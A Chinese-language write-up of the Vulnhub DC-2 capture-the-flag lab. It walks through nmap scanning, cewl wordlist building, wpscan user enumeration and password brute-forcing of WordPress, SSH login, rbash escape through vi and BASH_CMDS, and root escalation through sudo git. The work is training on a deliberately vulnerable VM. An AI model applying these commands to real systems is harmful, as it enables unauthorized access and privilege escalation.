介绍：Vulnhub-DC-2靶场。

0x00 前言

DC-2靶场是vulnhub平台下的DC系列靶机第二台，和DC-1一样，共有5个flag。

靶机下载地址为https://www.vulnhub.com/entry/dc-2,311/

0x01 渗透经过

安装好之后两台虚拟机使用net模式连接起来。

1.1 信息收集

通过网络适配器高级设置中可查看靶机MAC地址，再使用namp来确认靶机ip。

nmap -sS 192.168.30.0/24确认靶机ip。

继续使用nmap -sV -p- 192.168.30.171进行详细扫描。

访问80端口后会发现ip被重定向到http://dc-2/。

成功访问并使用wappalyzer发现为wordpress框架。

在首页发现flag1的提示，需要登录并使用cewl（kali自带工具，可以通过爬行网站关键字建立密码字典）。

1.2 爆破利用

在了解cwel的用法后，使用cewl http://dc-2/ -w dc-2pwd.txt生成字典。

wordpress4.7版本是存在用户枚举漏洞，通过此漏洞找出用户名。

使用wpscan --url http://dc-2/ -e u枚举出三个用户名分别为admin、jerry、tom。

得到用户名之后就可以爆破了。

使用wpscan --url dc-2 -U dc-2user.txt -P dc-2pwd.txt命令。

成功爆破出两个用户名和密码jerry/adipiscing、tom/parturient，接下来寻找系统登录路径。

使用dirb找到登录路径为http://dc-2/wp-admin/。

尝试登录后发现只有jerry可登录成功并成功找到flag1。

通过flag2的提示。

If you can't exploit WordPress and take a shortcut, there is another way.Hope you found another entry point.

用过端口扫描时还开放一个7744的ssh端口。

使用tom/parturient用户名进行登录。

输入ssh tom@192.168.30.171 -p 7744成功登录。

1.3 rbash逃逸

rbash与一般shell的区别在于会限制一些行为，会使一些命令无法执行。

找到flag3后发现cat等命令并无法使用。使用echo $0命令查看当前执行权限。

使用echo /home/tom/usr/bin/*命令查看当前可使用命令。

使用vi查看得到flag3。

根据flag3的提示我们需要切换到jerry用户中。

方法1：使用vi绕过rbash。

vi dc2:set shell=/bin/sh # 或者用/bin/bash:shell# 添加环境变量。给$PATH变量增加两个路径，用来查找命令export PATH=$PATH:/bin/export PATH=$PATH:/usr/bin/
方法2：更改环境变量绕过rbash。
BASH_CMDS[a]=/bin/sh;a    # 利用bash_cmds自定义一个shell# 添加环境变量export PATH=$PATH:/bin/export PATH=$PATH:/usr/bin
1.4 git提权
切换到爆破出的另一个账号jerry，找到flag4。
通过提示发现需要拿到root权限，使用sudo -l查看当前用户可执行与无法执行的指令。
输入：sudo git -p helpsudo git help pushsudo git help config   #进入git交互式界面!/bin/bash             #输入命令回车，拿到root权限
最后得到final_flag.txt。
0x02 总结
  1. 学会vi绕过rbash的限制和git提权的方法。
  2. 学会cwel和wpscan的用法。
